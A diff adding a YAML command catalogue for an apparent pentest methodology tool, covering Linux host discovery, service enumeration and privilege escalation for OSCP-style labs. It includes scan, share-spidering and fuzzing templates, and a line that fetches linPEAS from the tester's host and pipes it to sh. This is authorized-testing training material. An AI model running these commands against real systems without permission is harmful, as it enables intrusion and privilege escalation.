@@ -1,0 +1,462 @@
+# Cephalo content — Linux realm (core seed)
+# Authorized testing only. Canonical tool syntax with {{TOKENS}} from the registry.
+# YAML convention: template/cypher values are ALWAYS double-quoted; shell quoting
+# uses single quotes; avoid literal double-quotes and backslashes in templates.
+sections:
+  - id: linux.p1
+    title: Recon & Host Discovery
+    os: linux
+    phase: recon
+    order: 10
+    description: Find live hosts and map the attack surface before deep enumeration.
+    techniques: [linux.recon.host-discovery]
+    packs: [oscp]
+  - id: linux.p2
+    title: Port & Service Enumeration
+    os: linux
+    phase: enumeration
+    order: 20
+    description: Port is a first-class facet — enumerate every open service thoroughly.
+    techniques: [linux.enum.nmap, linux.enum.smb, linux.enum.web, linux.enum.ftp-ssh]
+    packs: [oscp]
+  - id: linux.p6
+    title: Linux Privilege Escalation
+    os: linux
+    phase: privilege-escalation
+    order: 60
+    description: From a low-priv shell to root via misconfig, SUID, sudo, cron, and kernel.
+    techniques:
+      - linux.privesc.enum
+      - linux.privesc.sudo
+      - linux.privesc.suid
+      - linux.privesc.cron
+      - linux.privesc.kernel
+    packs: [oscp]
+
+techniques:
+  - id: linux.recon.host-discovery
+    title: Host discovery
+    os: [linux]
+    phase: recon
+    summary: Identify live hosts on the subnet before per-host enumeration.
+    body: |
+      Start broad, then go deep. A ping sweep or ARP scan finds live hosts;
+      follow with a full TCP port scan per host. Do not skip UDP on quiet boxes.
+    commands: [linux.recon.ping-sweep, linux.recon.arp-scan]
+    tags: [nmap, enumeration]
+    archetypeBand: high
+    references: [ref.nmap]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.enum.nmap
+    title: Nmap full enumeration
+    os: [linux]
+    phase: enumeration
+    summary: Full TCP, then targeted service/version + default scripts; UDP top ports.
+    body: |
+      A two-stage pattern: a fast full-range TCP scan to discover open ports,
+      then a focused service scan against just those ports. Run a UDP top-ports
+      scan in parallel — SNMP/TFTP/DNS hide there.
+    commands:
+      - linux.enum.nmap.full
+      - linux.enum.nmap.scripts
+      - linux.enum.nmap.udp
+    tags: [nmap, enumeration]
+    ports: [21, 22, 80, 139, 443, 445]
+    services: [http, smb, ftp, ssh]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.nmap]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.enum.smb
+    title: SMB enumeration
+    os: [linux]
+    phase: enumeration
+    summary: Enumerate shares, users, and policy over SMB/RPC.
+    body: |
+      SMB is a goldmine: null/guest sessions, readable shares, user enumeration,
+      and password policy. On a domain-joined host this pivots straight into AD.
+    commands:
+      - linux.enum.smb.nxc-shares
+      - linux.enum.smb.smbclient-list
+      - linux.enum.smb.spider
+    tags: [smb, netexec, enumeration]
+    ports: [139, 445]
+    services: [smb]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.netexec, ref.rfc1001]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.enum.smb]
+
+  - id: linux.enum.web
+    title: Web content discovery
+    os: [linux]
+    phase: web
+    summary: Fingerprint the stack and brute-force content/vhosts.
+    body: |
+      Identify the tech stack, then discover hidden content and virtual hosts.
+      Feed findings back into targeted exploitation — never blind-fuzz forever.
+    commands:
+      - linux.enum.web.feroxbuster
+      - linux.enum.web.ffuf-vhost
+    tags: [http, web-enum]
+    ports: [80, 443, 8080]
+    services: [http]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.feroxbuster, ref.ffuf]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.enum.ftp-ssh
+    title: FTP & SSH enumeration
+    os: [linux]
+    phase: enumeration
+    summary: Banner-grab, anonymous FTP, and SSH auth methods.
+    commands: [linux.enum.ftp.anon, linux.enum.ssh.audit]
+    tags: [ftp, ssh, enumeration]
+    ports: [21, 22]
+    services: [ftp, ssh]
+    archetypeBand: medium
+    references: [ref.nmap]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.privesc.enum
+    title: Local privesc enumeration
+    os: [linux]
+    phase: privilege-escalation
+    summary: Automated + manual enumeration of the local attack surface.
+    body: |
+      Run an automated enumerator (linPEAS) but always corroborate manually:
+      `id`, `sudo -l`, SUID set, writable cron, capabilities, and kernel version.
+    commands: [linux.privesc.linpeas, linux.privesc.manual]
+    tags: [privesc, enumeration]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.winpeas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.privesc.sudo
+    title: sudo rights abuse
+    os: [linux]
+    phase: privilege-escalation
+    summary: Abuse misconfigured sudo entries to run a root shell (GTFOBins).
+    body: |
+      `sudo -l` reveals allowed commands. If a binary is listed and has a GTFOBins
+      sudo entry, it is almost certainly a root shell. Methodology only — confirm
+      the exact binary against GTFOBins.
+    commands: [linux.privesc.sudo.list, linux.privesc.sudo.gtfobins]
+    tags: [sudo, privesc]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.gtfobins]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.privesc.suid
+    title: SUID/SGID binary abuse
+    os: [linux]
+    phase: privilege-escalation
+    summary: Find SUID-root binaries and abuse known ones (GTFOBins).
+    commands: [linux.privesc.suid.find, linux.privesc.suid.gtfobins]
+    tags: [suid, privesc]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.gtfobins]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.privesc.cron
+    title: cron job abuse
+    os: [linux]
+    phase: privilege-escalation
+    summary: Hunt writable scripts run by root cron and tamper to escalate.
+    commands: [linux.privesc.cron.enum]
+    tags: [cron, privesc]
+    archetypeBand: high
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: linux.privesc.kernel
+    title: Kernel exploit (version-gated)
+    os: [linux]
+    phase: privilege-escalation
+    summary: Last resort — identify the kernel and search for a matching exploit.
+    body: |
+      Kernel exploits are version- and architecture-specific and can crash the
+      box. Identify the exact kernel, then search a vetted source. Never run an
+      offset/exploit you have not matched to the target version.
+    commands: [linux.privesc.kernel.identify]
+    prerequisites: [linux.privesc.enum]
+    tags: [privesc]
+    archetypeBand: medium
+    references: [ref.nvd, ref.hacktricks]
+    confidence: unverified
+    packs: [oscp]
+
+commands:
+  - id: linux.recon.ping-sweep
+    title: Nmap ping sweep
+    template: "nmap -sn {{TARGET}}/24 -oN sweep.txt"
+    tool: nmap
+    description: Discover live hosts on the /24 without port scanning.
+    os: [linux]
+    phase: recon
+    tags: [nmap]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+  - id: linux.recon.arp-scan
+    title: ARP scan (local segment)
+    template: "arp-scan --interface {{INTERFACE}} --localnet"
+    tool: arp-scan
+    description: Layer-2 host discovery on the local segment.
+    os: [linux]
+    phase: recon
+    tags: [enumeration]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.enum.nmap.full
+    title: Full TCP port scan
+    template: "nmap -p- --min-rate 2000 -T4 {{RHOST}} -oN nmap-full.txt"
+    tool: nmap
+    description: All 65535 TCP ports, fast, output saved.
+    os: [linux]
+    phase: enumeration
+    tags: [nmap]
+    notes:
+      - "--min-rate may miss ports on a lossy VPN; re-run slower if results look thin."
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.nmap.scripts
+    title: Service/version + default scripts
+    template: "nmap -sCV -p {{RPORT}} {{RHOST}} -oN nmap-scv.txt"
+    tool: nmap
+    description: Targeted service scan against the open ports found in the full scan.
+    os: [linux]
+    phase: enumeration
+    tags: [nmap]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.nmap.udp
+    title: UDP top-ports scan
+    template: "sudo nmap -sU --top-ports 50 {{RHOST}} -oN nmap-udp.txt"
+    tool: nmap
+    description: SNMP/TFTP/DNS and friends hide on UDP.
+    os: [linux]
+    phase: enumeration
+    tags: [nmap]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.enum.smb.nxc-shares
+    title: List SMB shares (netexec)
+    template: "netexec smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --shares"
+    tool: netexec
+    description: Enumerate shares and access level; works with null/guest too.
+    os: [linux]
+    phase: enumeration
+    tags: [smb, netexec]
+    notes:
+      - "For a null session use -u '' -p ''."
+      - "Watch the lockout policy before spraying."
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.smb.smbclient-list
+    title: smbclient share list
+    template: "smbclient -L //{{RHOST}}/ -U '{{USER}}%{{PASS}}'"
+    tool: smbclient
+    description: Classic share listing via smbclient.
+    os: [linux]
+    phase: enumeration
+    tags: [smb]
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.smb.spider
+    title: Spider a share for secrets (netexec)
+    template: "netexec smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' -M spider_plus"
+    tool: netexec
+    description: Recursively index readable shares for interesting files.
+    os: [linux]
+    phase: enumeration
+    tags: [smb, netexec]
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.enum.web.feroxbuster
+    title: Recursive content discovery (feroxbuster)
+    template: "feroxbuster -u {{URL}} -w {{WORDLIST}} -x php,txt,html -t 50"
+    tool: feroxbuster
+    description: Recursive directory/file brute-force with extensions.
+    os: [linux]
+    phase: web
+    tags: [http, web-enum]
+    confidence: verified
+    references: [ref.feroxbuster]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.web.ffuf-vhost
+    title: Virtual-host fuzzing (ffuf)
+    template: "ffuf -u {{URL}} -H 'Host: FUZZ.{{DOMAIN}}' -w {{WORDLIST}} -fs 0"
+    tool: ffuf
+    description: Discover name-based virtual hosts by fuzzing the Host header.
+    os: [linux]
+    phase: web
+    tags: [http, web-enum]
+    notes:
+      - "Tune -fs/-fc to filter the default response size/code."
+    confidence: verified
+    references: [ref.ffuf]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.enum.ftp.anon
+    title: Anonymous FTP check
+    template: "ftp -inv {{RHOST}}"
+    tool: ftp
+    description: Try anonymous login; list and pull any readable files.
+    os: [linux]
+    phase: enumeration
+    tags: [ftp]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+  - id: linux.enum.ssh.audit
+    title: SSH auth-method audit
+    template: "nmap -p 22 --script ssh-auth-methods --script-args='ssh.user={{USER}}' {{RHOST}}"
+    tool: nmap
+    description: Enumerate accepted SSH authentication methods for a user.
+    os: [linux]
+    phase: enumeration
+    tags: [ssh]
+    confidence: verified
+    references: [ref.nmap]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.privesc.linpeas
+    title: Run linPEAS
+    template: "curl -s http://{{LHOST}}/linpeas.sh | sh"
+    tool: linpeas
+    description: Automated local privilege-escalation enumeration.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [privesc, enumeration]
+    notes:
+      - "Host linpeas.sh on your box; piping to sh runs it in memory (noisy)."
+    confidence: verified
+    references: [ref.winpeas]
+    danger: medium
+    packs: [oscp]
+  - id: linux.privesc.manual
+    title: Manual privesc triage
+    template: "id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /etc/crontab"
+    description: The four manual checks that catch most boxes.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.privesc.sudo.list
+    title: List sudo rights
+    template: "sudo -l"
+    description: Show what the current user may run via sudo.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [sudo, privesc]
+    confidence: verified
+    references: [ref.gtfobins]
+    danger: low
+    packs: [oscp]
+  - id: linux.privesc.sudo.gtfobins
+    title: GTFOBins sudo escape (pointer)
+    template: "# look up the allowed binary's GTFOBins sudo entry — most are a root shell"
+    shell: text
+    description: Cross-reference each sudo-allowed binary with its GTFOBins sudo entry.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [sudo, privesc]
+    notes:
+      - "Methodology pointer — substitute the real GTFOBins one-liner for your binary."
+    confidence: verified
+    references: [ref.gtfobins]
+    danger: high
+    packs: [oscp]
+
+  - id: linux.privesc.suid.find
+    title: Find SUID binaries
+    template: "find / -perm -4000 -type f 2>/dev/null"
+    description: Enumerate SUID-root binaries.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [suid, privesc]
+    confidence: verified
+    references: [ref.gtfobins]
+    danger: low
+    packs: [oscp]
+  - id: linux.privesc.suid.gtfobins
+    title: GTFOBins SUID escape (pointer)
+    template: "# match the SUID binary against its GTFOBins SUID entry"
+    shell: text
+    description: Cross-reference each SUID binary with GTFOBins' SUID section.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [suid, privesc]
+    confidence: verified
+    references: [ref.gtfobins]
+    danger: high
+    packs: [oscp]
+
+  - id: linux.privesc.cron.enum
+    title: Enumerate cron + writable scripts
+    template: "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; grep -Rsn . /etc/cron* 2>/dev/null"
+    description: Find root cron jobs that call world-writable scripts.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [cron, privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: linux.privesc.kernel.identify
+    title: Identify kernel + search exploits
+    template: "uname -a; cat /etc/os-release; searchsploit linux kernel"
+    description: Capture exact kernel/distro, then search a vetted exploit source.
+    os: [linux]
+    phase: privilege-escalation
+    tags: [privesc]
+    notes:
+      - "Kernel exploits are version-specific and can panic the box — match exactly, test last."
+    confidence: unverified
+    references: [ref.nvd, ref.hacktricks]
+    danger: critical
+    packs: [oscp]
